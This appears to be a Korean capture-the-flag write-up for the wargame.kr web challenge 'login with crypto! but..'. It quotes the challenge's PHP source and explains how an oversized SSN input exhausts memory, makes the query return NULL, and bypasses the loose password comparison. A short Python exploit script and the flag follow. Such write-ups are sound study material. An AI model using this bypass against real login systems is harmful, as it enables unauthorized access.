---
layout: post
title: login with crypto! but..
category: Web
rpath: /resource/login_with_crypto_but
tag: [php, bof] 
---

**Category:** Web

**Source:** wargame.kr

**Points:** 448

**Author:** Jisoon Park(js00n.park)

**Description:** 

> sucker_enc is sucks.
> 
> Can you login?

## Write-up

id, ssn, password를 이용한 로그인 시스템이다. 소스 코드를 살펴보면 id와 password는 그대로 DB에 저장하고, ssn은 sucker_enc()라는 함수를 이용해 암호화 하여 저장한다.

```php
(... 생략 ...)

function enc($str){
 $s_key = "L0V3LySH:butsheismyxgf..";
 $s_vector_iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_3DES, MCRYPT_MODE_ECB), MCRYPT_RAND);
 $en_str = mcrypt_encrypt(MCRYPT_3DES, $s_key, $str, MCRYPT_MODE_ECB, $s_vector_iv);
 $en_base64 = base64_encode($en_str);
 $en_hex = bin2hex($en_str);
 return $en_hex;
}

function sucker_enc($str){
 for($i=0;$i<8;$i++) $str = enc($str);
 return $str;
}

function get_password($user,$ssn){
 db_conn();
 $user = mysql_real_escape_string($user);
 $ssn  = mysql_real_escape_string($ssn);
 $result = mysql_query("select user_ps from accounts where user_id='{$user}' and encrypt_ss='".sucker_enc($ssn)."'");
 $row = mysql_fetch_array($result);
 if ($row === false) {
  die("there is not valid account!");
 }
 return $row[0]; 
}

ini_set("display_errors", true);

if( (isset($_POST['user']) && isset($_POST['ssn']) && isset($_POST['pass'])) ){
 
 sleep(2); // do not bruteforce !!!! this challenge is not for bruteforce!!

 if($_POST['pass'] == get_password($_POST['user'],$_POST['ssn'])){

  if($_POST['user'] == "admin"){
   echo "Login Success!!! PASSWORD IS : <b>".auth_code("login with crypto! but..")."</b>";
  }else{
   echo "Login Success. but you r not 'admin'..";
  }
 }else{
  echo "Login Failed";
 }

}
```

소스코드에 admin의 ssn이 나와 있긴 하지만 password와 ssn을 모두 알 수 없다면 로그인은 어려워 보인다.

get_password() 함수에서 sucker_enc() 함수의 결과값을 내 마음대로 바꿀 수 있다면 sql injection이 가능할 것 같아 sucker_enc()와 enc() 함수를 좀 더 살펴보았지만, sucker_enc() 함수는 hex string을 돌려주기 때문에 이를 이용한 sql injection은 어려울 것 같았다.

sucker_enc() 함수를 좀 더 살펴보다가 DB에 들어가는 결과값을 보았는데 '881114'에 대한 암호화 결과가 2048 바이트였다. 좀 더 긴 문자열을 암호화 해보았더니 대충 256배로 길이가 늘어나는것 같았다.

혹시나 해서 php의 string형 데이터에 길이 제한이 있는지 살펴봤더니 다음과 같은 사실을 알 수 있었다.

* php 7.0.0 이상(64bit)에서는 문자열 최대 길이에 제한이 없음
* php 5.x 이상(32bit)에서는 문자열 최대 길이가 최대 2GB(길이가 signed int로 저장됨)
* 최대 길이가 그렇고, 실제로는 php.ini에 정의된 memory_limit 값에 의해 정의되는데, PHP 5.2에서는 default로 128MB이고, 그 이전 버전에서는 8MB였음

256배로 길이가 늘어났었으니 일단 기본값 128MB의 1/256인 524,288 byte 입력을 넣어서 어떻게 되나 확인해 보았다.

![img]({{page.rpath|prepend:site.baseurl}}/error.png)

에러가 발생한다! ㅎㅎㅎㅎ  코드에 보면 ini_set() 함수를 이용해서 에레 메세지를 돌려주도록 되어있는 덕분인것 같다. 제대로 가고 있다는 이야기다.

입력 길이를 반씩 줄여가면서 에러가 발생하지 않을때까지 반복해 보았다. 262,144 길이의 입력에서는 동일하게 에러가 발생하였고, 131,072 길이의 입력을 넣었더니 에러가 warning으로 바뀌었다.

![img]({{page.rpath|prepend:site.baseurl}}/warning.png)

에러가 발생한 것은 줄번호 39라인의 bin2hex() 구문이었는데, warning은 52라인에서의 query 실패와 53라인에서 mysql_fetch_array()에 boolean이 들어왔다는 내용이었다. (어쨌든 결과는 Login Failed)

코드를 다시 보면, mysql_fetch_array() 함수에서 문제가 생겨서 FALSE가 리턴된 후 mysql_fetch_array() 함수에 FALSE가 들어간 것으로 생각된다. 발생한게 warning이고 "Login Failed" 메세지까지 나온걸 보면 일단 계속 진행은 되었던 것 같다.

mysql_fetch_array(FALSE)는 NULL을 리턴했을 거고, <b>NULL === FALSE는 FALSE</b>이니 "there is not valid account!" 메세지가 나오지 않은 것이 이해가 간다.

그럼, get_password() 함수는 최종적으로 NULL을 리턴할 것이다. (확신이 안가서 php 테스트 코드를 만들어 테스트 해보았다.)

get_password() 함수의 결과값을 pass와 비교하고 있으니, pass를 NULL로 만들어서 flag를 획득할 수 있었다.


```python
import requests

'''
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}
'''

URL = 'http://wargame.kr:8080/login_with_crypto_but/index.php'
data = {'user' : 'admin', 'ssn' : '0' * 131072, 'pass' : ''}

response = requests.post(URL, data = data) #, proxies = proxies)
print response.text
```

![img]({{page.rpath|prepend:site.baseurl}}/flag.png)

Flag : **5ffa466ab40ecdc6d5ea01ea04a3b52c9cd15986**
